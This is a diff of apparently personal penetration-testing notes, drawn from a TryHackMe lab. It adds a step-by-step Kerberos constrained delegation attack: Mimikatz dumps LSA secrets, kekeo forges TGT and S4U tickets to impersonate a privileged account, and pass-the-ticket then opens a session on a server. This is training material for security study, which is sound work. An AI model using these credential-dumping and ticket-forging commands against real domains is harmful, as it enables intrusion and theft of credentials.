@@ -1,4 +1,6 @@
-## Kerberoasting
+## Kerberos
+
+### Kerberoasting
 
 - Any valid user gets a ticket with kerberos to access a service (SQL for instance)
 - Tool: GetUsersSPNS.py - Impacket
@@ -60,3 +62,52 @@
   ```
   smbclient \\\\10.10.10.100\\Users -U active.htb\\Administrator
   ```
+
+### Exploiting Kerberos Delegation
+
+The practical use of Kerberos Delegation is to enable an application to access resources hosted on a different server. An example of this would be a web server that needs to access a SQL database hosted on the database server for the web application that it is hosting. Without delegation, we would probably use an AD service account and provide it with direct access to the database. When requests are made on the web application, the service account would be used to authenticate to the database and recover information.
+
+However, we can allow this service account to be delegated to the SQL server service. Once a user logs into our web application, the service account will request access to the database on behalf of that user. This means that the user would only be able to access data in the database that they have the relevant permissions for without having to provide any database privileges or permissions to the service account itself.
+
+Source: [TryHackMe](https://tryhackme.com/room/exploitingad)
+
+#### Example
+
+- Enerumerate available delegations with a privileged user
+  - `Import-Module C:\Tools\PowerView.ps1`
+  - `Get-NetUser -TrustedToAuth`
+- Dump LSASecrets with [Mimikatz](https://github.com/gentilkiwi/mimikatz/security)
+  - `mimikatz.exe`
+  - `token::elevate` To dump the secrets from the registry hive, we need to impersonate the SYSTEM user.
+  - `lsadump::secrets` Mimikatz interacts with the registry hive to pull the clear text credentials.
+  
+![Dump](../.res/2022-07-29-13-06-16.png)  
+
+- Perform the kerberos delegation attack with [kekeo](https://github.com/gentilkiwi/kekeo) `kekeo.exe`
+- `tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:redacted` generate a TGT that can be used to generate tickets for the HTTP and WSMAN services
+  - user - The user who has the constrained delegation permissions.
+  - domain - The domain that we are attacking since Kekeo can be used to forge tickets to abuse cross-forest trust.
+  - password - The password associated with the svcIIS account.
+
+![generate TGT](../.res/2022-07-29-13-08-20.png)  
+
+- `/user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc` forge TGS requests for the account we want to impersonate. We need to perform this for both HTTP and WSMAN to allow us to create a PSSession on THMSERVER1
+  - tgt - We provide the TGT that we generated in the previous step.
+  - user - The user we want to impersonate. Since t2 accounts have administrative access over workstations, it is a safe assumption that t1 accounts will have administrative access over servers, so choose a t1_ account that you would like to impersonate.
+  - service - The services we want to impersonate using delegation. We first generate a TGS for the HTTP service. Then we can rerun the same command for the WSMAN service. `tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:wsman/THMSERVER1.za.tryhackme.loc`
+- Import the tickets with Mimikatz
+
+```dos
+privilege::debug
+kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
+kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
+```
+
+- You should have a similar output  
+
+![output](../.res/2022-07-29-15-35-02.png)
+
+- You can run `klist` to check that the tickets were imported
+- We just need to create our session in our target  
+
+![Session](../.res/2022-07-29-15-37-15.png)
